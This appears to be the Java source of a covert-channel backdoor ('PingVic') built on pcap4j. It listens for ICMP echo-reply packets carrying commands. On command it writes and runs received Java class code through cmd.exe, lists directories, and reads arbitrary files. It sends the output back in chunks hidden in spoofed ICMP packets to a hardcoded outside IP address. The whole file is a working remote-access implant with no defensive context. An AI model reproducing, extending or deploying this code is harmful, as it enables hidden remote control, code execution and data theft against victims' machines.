package PingVic;



import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import org.pcap4j.core.NotOpenException;
import org.pcap4j.core.PacketListener;
import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNativeException;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.Pcaps;
import org.pcap4j.core.BpfProgram.BpfCompileMode;
import org.pcap4j.core.PcapNetworkInterface.PromiscuousMode;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.IcmpV4CommonPacket;
import org.pcap4j.packet.IcmpV4DestinationUnreachablePacket;
import org.pcap4j.packet.IcmpV4EchoPacket;
import org.pcap4j.packet.IcmpV4EchoReplyPacket;
import org.pcap4j.packet.IpV4Packet;
import org.pcap4j.packet.IpV4Rfc791Tos;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.UnknownPacket;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.packet.namednumber.IcmpV4Code;
import org.pcap4j.packet.namednumber.IcmpV4Type;
import org.pcap4j.packet.namednumber.IpNumber;
import org.pcap4j.packet.namednumber.IpVersion;
import org.pcap4j.util.MacAddress;




public class pivic
{
	
	protected static String srcIP;
	protected static String dstIP="117.248.80.26";
	protected static String in_num="0";
	protected static MacAddress SRC_MAC_ADDR;
	protected static boolean shutdown=false;
	protected static PcapNetworkInterface nif;
	protected static boolean once=false;
	
	public static void main(String args[])
	{
	
		/*String g=System.getProperty("java.library.path");
		System.out.println(g);
		
		if(System.getProperty("os.arch").equalsIgnoreCase("x86"))
		{
			g=pivic.class.getClassLoader().getResource("./x86/wpcap.dll").toString()+";"+g;
		}
		else if(System.getProperty("os.arch").equalsIgnoreCase("x64"))
		{
			g="./x64;"+g;
		}
		System.setProperty("java.library.path",g);
		System.out.println("\n\n\n\n\n"+g);*/
		
		
		obtain_src_ip ip=new obtain_src_ip(in_num);
		ip.start();
		
		rec_sen rs=new rec_sen();
		rs.start();
		
		
	}
}

class obtain_src_ip extends Thread
{
	private static String g;
	
	obtain_src_ip(String h)
	{
		g=h;
	}
	public void run()
	{
		try 
		{
			new src_ip().Setup(g);
		} 
		catch (UnknownHostException | PcapNativeException | NotOpenException e)
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		System.out.println("hello"+pivic.in_num);
	}
}

class rec_sen extends Thread
{
	public void run()
	{
		
	}
	
}
class scheduler extends Thread
{
	private static int duration;
	protected static boolean flag=false;
	private static Task t2;
	protected void reset()
	{
		flag=false;
	}
	scheduler(int t,Task t1)
	{
		duration=t;
		t2=t1;
	}
	
	public void run()
	{
		long t=System.currentTimeMillis();
		while(System.currentTimeMillis()-t<duration)
		{
			
		}
		flag=true;
		if(flag && src_ip.resolvedAddr==null)
		{
			try
			{
				t2.handle.breakLoop();
				throw new TimeoutException();
			}
			catch(NotOpenException |TimeoutException e)
			{
				
				System.out.println("Timeout");
				pivic.in_num=(Integer.parseInt(pivic.in_num)+1)+"";
				new obtain_src_ip(pivic.in_num).start();
			}
			
		}
		else if(src_ip.resolvedAddr!=null)
		{
			pivic.nif=src_ip.nic;
			pivic.srcIP=pivic.nif.getAddresses().toString();
			pivic.srcIP=pivic.srcIP.substring(pivic.srcIP.lastIndexOf("address"),pivic.srcIP.lastIndexOf("netmask"));
			pivic.srcIP=pivic.srcIP.substring(pivic.srcIP.indexOf("/")+1,pivic.srcIP.lastIndexOf("]"));
			String h=src_ip.nic.getLinkLayerAddresses().toString();
			h=h.substring(1,h.length()-1);
			pivic.SRC_MAC_ADDR=MacAddress.getByName(h);
			listen.sendPack(pivic.srcIP);
			new listen().start();
			
		}
	}
	
}
class listen extends Thread 
{
	 private static final String COUNT_KEY= pivic.class.getName() + ".count";
	 private static final int COUNT= Integer.getInteger(COUNT_KEY, 10);
	 private static final String READ_TIMEOUT_KEY = pivic.class.getName() + ".readTimeout";
	 private static final int READ_TIMEOUT= Integer.getInteger(READ_TIMEOUT_KEY, 10); // [ms]
	 private static final String SNAPLEN_KEY= pivic.class.getName() + ".snaplen";
	 private static final int SNAPLEN = Integer.getInteger(SNAPLEN_KEY, 65536); // [bytes]
	 private static Packet pacp;
	 private static String recv_data="";
	 
	listen() 
	{
		
	}

	public void run()
	{
	
		System.out.println("hehh  "+COUNT_KEY+"   "+COUNT+" "+READ_TIMEOUT+"  "+SNAPLEN);
		PcapHandle handle;
		PcapHandle sendhandle;
		try
		{
			handle = pivic.nif.openLive(SNAPLEN, PromiscuousMode.PROMISCUOUS, READ_TIMEOUT);
			sendhandle = pivic.nif.openLive(SNAPLEN, PromiscuousMode.PROMISCUOUS, READ_TIMEOUT);


		} catch (PcapNativeException e) 
		{
			handle=null;
			
		
			e.printStackTrace();
		}
		System.out.println(pivic.srcIP);
		System.out.println(pivic.dstIP);
		 ExecutorService pool = Executors.newSingleThreadExecutor();
		 try {
			handle.setFilter(
			    "icmp and dst host " + pivic.srcIP,
			    //  + " and ether dst " + Pcaps.toBpfString(pivic.SRC_MAC_ADDR),
			    BpfCompileMode.OPTIMIZE
			  );
		} 
		catch (PcapNativeException e2)
		{
			
			e2.printStackTrace();
		} 
		catch (NotOpenException e2) 
		{
			
			e2.printStackTrace();
		}
		System.out.println(handle);
		PacketListener listener = new PacketListener() 
		{
			  @Override
			  public void gotPacket(Packet packet) 
			  {
			
				  if (packet.contains(IpV4Packet.class))
				  {
					  IpV4Packet ipv4=packet.get(IpV4Packet.class);
					  if(ipv4.contains(IcmpV4CommonPacket.class))
					  {
						  pacp=packet;
						  IcmpV4CommonPacket icmp_reply=packet.get(IcmpV4CommonPacket.class);
						  if (icmp_reply.getHeader().getType().equals(IcmpV4Type.ECHO_REPLY))
						  {
							 
							  IcmpV4EchoReplyPacket pac=icmp_reply.get(IcmpV4EchoReplyPacket.class);
							  recv_data=new String(pac.getRawData());
						  }
						  
					  }
					  	
					  
				  }
			  }
		  };
		  Task t=new Task(handle,listener);
		  pool.execute(t);
		  
		  try 
		  {
				Thread.sleep(5000);
		  }
		  catch (InterruptedException e1)
			{
			
				e1.printStackTrace();
			}
		while(!pivic.shutdown)
		{
			if(handle.isOpen() && !recv_data.equalsIgnoreCase(""))
			{
				//System.out.println("hello");
					recv_data=recv_data.substring(4,recv_data.length());
					System.out.println(recv_data.substring(0,4));
			     if(recv_data.equalsIgnoreCase("image"))
				{
					File f=new File("./hello.jpg");
					try {
						byte[] img=recv_data.getBytes();
						Path p=f.toPath();
						Files.write(p,img);
					} catch (IOException e3) {
						// TODO Auto-generated catch block
						e3.printStackTrace();
					}
				}	
			     else if(recv_data.indexOf("Java")!=-1)
			     {
			    	 System.out.println("remote code");
			    	 String g=recv_data.substring(5,recv_data.length());
			    	 
			    	 try 
			    	 {
						FileWriter f=new FileWriter(new File("./test1.class"),false);
						f.write(g);
						f.close();
						Process p=Runtime.getRuntime().exec("C:/Windows/System32/cmd.exe");
						BufferedWriter ou=new BufferedWriter(new OutputStreamWriter(p.getOutputStream()));
						Scanner k=new Scanner(new InputStreamReader(p.getInputStream()));
						ou.write("java test1");
						ou.write("\n");
						ou.flush();
						String g1=k.nextLine();
						while(g1!=null)
						{
							System.out.println(g1);
							g1=k.nextLine();
						}
						
					}
			    	 catch (IOException e)
			    	 {
				
						e.printStackTrace();
					}
			    	 
			    	 
			     }
			     else if(recv_data.startsWith("search"))
			     {
			    	 System.out.println("HHHHH");
			    	try 
			    	{
			    		String com="dir";
			    	
						Process p=(Runtime.getRuntime().exec("C:/Windows/System32/cmd.exe"));
				    	 BufferedWriter out=new BufferedWriter(new OutputStreamWriter(p.getOutputStream()));
				    	 Scanner k=new Scanner(new InputStreamReader(p.getInputStream()));
				    	 String g="";
				    	 boolean flag=false;
				    	 
				    	 while(!flag)
				    	 {
				    		 out.write(com);
				    		 out.write("\n");
				    		 out.flush();
				    		// System.out.println("hgh");
				    		 while(k.hasNextLine())
				    		 {
				    			 String h=k.nextLine();
				    			 g=g+"\n"+h;
				    			 System.out.println(h);
				    			 if(h.indexOf("free")!=-1)break;
				    			 else if(h.endsWith(":\\"))flag=true;
				    		 }

				       		 out.write("cd .."); 
				       		 out.write("\n");
				    	 }
				    	 
				    	 System.out.println(g.getBytes().length);
				    	 recv_data=g;
				    	 
					} 
			    	catch (IOException e) 
			    	{
						
						e.printStackTrace();
					}
			     }
			     else if(recv_data.startsWith("File"))
			     {
			    	 String g=recv_data.substring(7,recv_data.length());
			    	 try
			    	 {
						Scanner k=new Scanner(new File(g));
						g="";
						while(k.hasNextLine())
						{
							g=g+"\n"+k.nextLine();
						}
						recv_data=g;
			    	 } 
			    	 catch (FileNotFoundException e) 
			    	 {
						e.printStackTrace();
			    	 }
			     }
			     String j="";
			     byte[] arr=recv_data.getBytes();
			   System.out.println(recv_data.length()+"   jjkk");
			     for(int i=0;i<recv_data.length();i++)
			     {
			    	 j=j+recv_data.charAt(i);
			    	 if(i%500==0 && i!=0)
			    	 {
			    		 sendPack(j);
			    		 j="";
			    	 }
			    	 else if(recv_data.length()<500)
			    	 {
			    		 sendPack(recv_data);
			    		 break;
			    	 }
			     }
			     //sendPack(recv_data);
			     
									recv_data="";
			}
		}
		try
		{
			pool.shutdown();
			handle.breakLoop();
			handle.close();
			System.exit(0);
		}
		catch(Exception e)
		{
			System.out.println("Handle release , Closing");
		}
		  
	}
	private static class Task implements Runnable
	{
		private PcapHandle handle;
		private PacketListener listener;
		public Task(PcapHandle handle,PacketListener listener)
		{
			this.handle=handle;
			this.listener=listener;
			
		}
		@Override
		public void run()
		{
			 try 
		      {
		    	 handle.loop(COUNT, listener);
		      } 
		      catch (PcapNativeException e) 
		      {
		        e.printStackTrace();
		      } 
		      catch (InterruptedException e) 
		      {
		        System.out.println("Closing");
		      }
		      catch (NotOpenException e) 
		      {
		        e.printStackTrace();
		      } 
		}
	}
	public static void sendPack(String g)
	{
		PcapHandle sendhandle;
		try {
			sendhandle = pivic.nif.openLive(SNAPLEN, PromiscuousMode.PROMISCUOUS, READ_TIMEOUT);
		} catch (PcapNativeException e2) {
			// TODO Auto-generated catch block
			sendhandle=null;
		}

		IcmpV4EchoReplyPacket.Builder pac1=new IcmpV4EchoReplyPacket.Builder();
		UnknownPacket.Builder pac2=new UnknownPacket.Builder();
		String raw="ACK : "+g;
		System.out.println(raw.getBytes().length);
		pac2.rawData(raw.getBytes());
		pac1.payloadBuilder(pac2);
		IcmpV4CommonPacket.Builder pac3=new IcmpV4CommonPacket.Builder();
		pac3.code(IcmpV4Code.NO_CODE)
		.type(IcmpV4Type.ECHO_REPLY)
		.correctChecksumAtBuild(true)
		.payloadBuilder(pac1);
		
		IpV4Packet.Builder pac4=new IpV4Packet.Builder();
		try {
			pac4
			.srcAddr((Inet4Address)InetAddress.getByName("192.168.1.3"))
			.dstAddr((Inet4Address)InetAddress.getByName(pivic.dstIP))
			.correctChecksumAtBuild(true)
			.payloadBuilder(pac3)
			.version(IpVersion.IPV4)
			.identification((short)100)
			.ttl((byte)100)
			.protocol(IpNumber.ICMPV4)
			.correctLengthAtBuild(true)
			.tos(IpV4Rfc791Tos.newInstance((byte)0));
		} catch (UnknownHostException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		
		EthernetPacket.Builder pac5=new EthernetPacket.Builder();
		pac5.dstAddr(src_ip.resolvedAddr)
		.srcAddr(pivic.SRC_MAC_ADDR)
		.payloadBuilder(pac4)
		.type(EtherType.IPV4)
		.paddingAtBuild(true);
		Packet p=pac5.build();
		try {
			sendhandle.sendPacket(p);
		} catch (PcapNativeException | NotOpenException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		try {
			Thread.sleep(1000);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		sendhandle.close();
		
		
		
	
		/*File f=new File("C:/Users/Computer/Documents/hello.class");
		FileWriter writ;
		try 
		{
			writ=new FileWriter(f,false);
			writ.write(recv_data);
			writ.close();
		} 
		catch (IOException e) 
		{
			writ=null;
			e.printStackTrace();
		}*/
		if(recv_data.equalsIgnoreCase("exit"))
		{
			pivic.shutdown=true;
		}

	}
}
